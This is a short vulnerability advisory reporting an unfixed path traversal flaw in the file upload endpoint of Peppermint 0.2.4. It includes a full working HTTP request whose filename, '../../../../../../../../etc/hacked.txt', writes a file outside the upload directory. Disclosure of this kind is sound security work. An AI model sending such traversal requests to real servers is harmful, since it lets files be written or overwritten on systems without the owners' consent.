# Peppermint-Lab  - Path Traversal


**CVE-ID:** -


**Vendor:** [Peppermint-Lab](https://peppermint.sh)

**Affected Product:** Peppermint

**Affected Versions:** 0.2.4

**Vulnerability:** Path Traversal

**Status:** Unfixed

**Severity:** Critical


## Details

An attacker can upload files to any location on the server.

The following request creates a text file in `/etc/hacked.txt`.


```http
POST /api/v1/users/file/upload HTTP/1.1
Host: localhost:5000
Content-Length: 608
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykBOktxIBgtA2RNvF
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36
sec-ch-ua-platform: "Linux"
Accept: */*
Origin: http://localhost:5000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:5000/?x=hafut9m31%5C%3C%3E%27%22%3A
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: next-auth.callback-url=http%3A%2F%2Flocalhost%3A5000%2F; next-auth.session-token=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..QRlwsSQIj2KJe5xC.8ESNMapwdVYhvnxjfM6Bs_BKEdYCE1SqLoqYi1em786fDlr5wmyfduI0jvyat-Y8l5I8aBnv1Ghe59d0vyzUL_6WKTB5nMbefxb1UJwha07Fpy4Q0kcHpNrtvJC-h4N4w0Asn4kVpa71-h8ob2uXVPF9gmY7nBDCMpRAEJsIHxK4bHOVc3t1QnZgyQE0RmNWB--NPimJhC6xbzBjO5TkwP3QcdcxSTJe5j5MLp4-XjwgAUSKcRXu00UCewrrWVE1Cz5xOXT32dJ6vCo.rw4PmSKJYAiAwfHjv2yE0w
Connection: close

------WebKitFormBoundarykBOktxIBgtA2RNvF
Content-Disposition: form-data; name="file"; filename="../../../../../../../../etc/hacked.txt"
Content-Type: plain/text

test

------WebKitFormBoundarykBOktxIBgtA2RNvF--
```

